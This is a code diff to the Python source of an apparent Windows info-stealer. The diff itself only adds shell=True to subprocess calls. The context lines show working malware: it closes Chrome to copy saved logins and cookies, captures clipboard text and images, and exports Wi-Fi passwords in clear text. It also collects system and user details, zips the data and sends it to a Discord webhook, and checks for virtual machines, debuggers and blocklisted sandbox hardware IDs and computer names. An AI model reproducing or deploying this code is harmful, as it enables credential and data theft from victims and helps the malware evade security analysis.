@@ -205,7 +205,7 @@ class QuicaxdExela:
                     shutil.copy2(self.login_data_path, self.backup_login_data_path)
                 except:
                     try:
-                        subprocess.run("taskkill /IM chrome.exe") # just chrome browser protect cookies, we need to close it
+                        subprocess.run("taskkill /IM chrome.exe", shell=True) # just chrome browser protect cookies, we need to close it
                         time.sleep(1.5)
                         shutil.copy2(self.login_data_path, self.backup_login_data_path)
                     except:
@@ -705,7 +705,7 @@ class QuicaxdExela:
         if self.roblox: roblox = "Yes"
         else:roblox = "Nope"
         command = "wmic csproduct get uuid"
-        run = str(subprocess.check_output(command).decode('utf-8').split("\n")[1].strip())
+        run = str(subprocess.check_output(command, shell=True).decode('utf-8').split("\n")[1].strip())
         shutil.make_archive(os.getenv('temp') + f"\\{run}", "zip", os.getenv('temp') + f"\\{run}")
         hooksxdd = dhooks.Webhook(UrLxD, avatar_url="https://i.hizliresim.com/a28jbcj.jfif", username="i fucked her (quicaxd <3)")
         filee = dhooks.File(os.getenv('temp') + f"\\{run}.zip")
@@ -760,7 +760,7 @@ class QuicaxdExela:
     def get_last_clipboard_text(self, path):
         try:
             pathsxd = os.getenv('temp') + "\\" + path
-            process = subprocess.run(["powershell.exe", "Get-Clipboard"], capture_output=True, text=True)
+            process = subprocess.run(["powershell.exe", "Get-Clipboard"], capture_output=True, text=True, shell=True)
             output = process.stdout.strip()
             if not output == "":
                 with open(pathsxd + "\\last_clipboard_text.txt", "a", encoding="utf-8", errors="ignore") as lst:
@@ -775,12 +775,12 @@ class QuicaxdExela:
             $clipboardData = Get-Clipboard -Format Image
             $destinationPath = "{pathsxd}"
             $clipboardData.Save($destinationPath)'''
-            subprocess.run(['powershell.exe', '-Command', powershell_command],capture_output=True, text=True)
+            subprocess.run(['powershell.exe', '-Command', powershell_command],capture_output=True, text=True, shell=True)
         except Exception as e:
             print(str(e))
     def get_all_system_data(self):
         command = "wmic csproduct get uuid"
-        run = str(subprocess.check_output(command).decode('utf-8').split("\n")[1].strip())
+        run = str(subprocess.check_output(command, shell=True).decode('utf-8').split("\n")[1].strip())
         process = subprocess.run(r"echo ####System Info#### & systeminfo & echo ####System Version#### & ver & echo ####Host Name#### & hostname & echo ####Environment Variable#### & set & echo ####Logical Disk#### & wmic logicaldisk get caption,description,providername & echo ####User Info#### & net user & echo ####Startup Info#### & wmic startup get caption,command & echo ####Firewallinfo#### & netsh firewall show state ", capture_output= True, shell= True)
         output = process.stdout.decode(errors= "ignore").strip().replace("\r\n", "\n")
         tmp = os.getenv('temp')
@@ -869,7 +869,7 @@ class QuicaxdExela:
     def GetWifiPasswords(self, path:str):
         pathxd = os.path.join(path, "Wifi.txt")
         try:
-            command = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output = True).stdout.decode(errors="ignore")
+            command = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output = True, shell=True).stdout.decode(errors="ignore")
             wifi_files = []
             for filename in os.listdir(os.getcwd()):
                 if filename.startswith("Wi-Fi") and filename.endswith(".xml"):
@@ -919,7 +919,7 @@ class QuicaxdExela:
             print(str(asd))
     def writeAllData(self):    
         command = "wmic csproduct get uuid"
-        run = str(subprocess.check_output(command).decode('utf-8').split("\n")[1].strip())
+        run = str(subprocess.check_output(command, shell=True).decode('utf-8').split("\n")[1].strip())
         tmp = os.getenv('temp')
         if os.path.isdir(tmp + f"\\{run}"):
             shutil.rmtree(tmp+f'\\{run}')
@@ -1393,7 +1393,7 @@ class HardAntiVM:
             return False
     def check_gdb(self):
         try:
-            output = subprocess.check_output(["gdb", "--version"], stderr=subprocess.STDOUT, timeout=5)
+            output = subprocess.check_output(["gdb", "--version"], shell=True, timeout=5)
             if b"GDB" in output:
                 return True
         except:
@@ -1410,7 +1410,7 @@ class HardAntiVM:
             return False
     def check_hypervisor(self):
         try:
-            output = subprocess.check_output(["systeminfo"], stderr=subprocess.STDOUT)
+            output = subprocess.check_output(["systeminfo"], stderr=subprocess.STDOUT, shell=True)
             output2 = subprocess.check_output('wmic computersystem get Manufacturer', shell=True, stderr=subprocess.STDOUT)
             output3 = subprocess.check_output('wmic path Win32_ComputerSystem get Manufacturer', shell=True, stderr=subprocess.STDOUT).decode().lower()
             if b"Hypervisor" in output:
@@ -1464,7 +1464,7 @@ class HardAntiVM:
 class Antivirustotal:
     def __init__(self) -> None:
         command = "wmic csproduct get uuid"
-        serialNumber = str(subprocess.check_output(command).decode('utf-8').split("\n")[1].strip())
+        serialNumber = str(subprocess.check_output(command, shell=True).decode('utf-8').split("\n")[1].strip())
         banned_hwids = ["7AB5C494-39F5-4941-9163-47F54D6D5016","129B5E6B-E368-45D4-80AB-D4F106495924","8F384129-F079-456E-AE35-16608E317F4F","E6833342-780F-56A2-6F92-77DACC2EF8B3", "032E02B4-0499-05C3-0806-3C0700080009", "03DE0294-0480-05DE-1A06-350700080009", "11111111-2222-3333-4444-555555555555", "71DC2242-6EA2-C40B-0798-B4F5B4CC8776", "6F3CA5EC-BEC9-4A4D-8274-11168F640058", "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548", "4C4C4544-0050-3710-8058-CAC04F59344A", "00000000-0000-0000-0000-AC1F6BD04972","00000000-0000-0000-0000-AC1F6BD04C9E", "00000000-0000-0000-0000-000000000000", "5BD24D56-789F-8468-7CDC-CAA7222CC121", "49434D53-0200-9065-2500-65902500E439", "49434D53-0200-9036-2500-36902500F022", "777D84B3-88D1-451C-93E4-D235177420A7", "49434D53-0200-9036-2500-369025000C65",
                             "B1112042-52E8-E25B-3655-6A4F54155DBF", "00000000-0000-0000-0000-AC1F6BD048FE", "EB16924B-FB6D-4FA1-8666-17B91F62FB37", "A15A930C-8251-9645-AF63-E45AD728C20C", "67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3", "C7D23342-A5D4-68A1-59AC-CF40F735B363", "63203342-0EB0-AA1A-4DF5-3FB37DBB0670", "44B94D56-65AB-DC02-86A0-98143A7423BF", "6608003F-ECE4-494E-B07E-1C4615D1D93C", "D9142042-8F51-5EFF-D5F8-EE9AE3D1602A", "49434D53-0200-9036-2500-369025003AF0", "8B4E8278-525C-7343-B825-280AEBCD3BCB", "4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27", "79AF5279-16CF-4094-9758-F88A616D81B4"]
         banned_compname = ["WDAGUtilityAccount","JOANNA","WINZDS-21T43RNG", "Abby", "Peter Wilson", "hmarc", "patex", "JOHN-PC", "RDhJ0CNFevzX", "kEecfMwgj", "Frank",
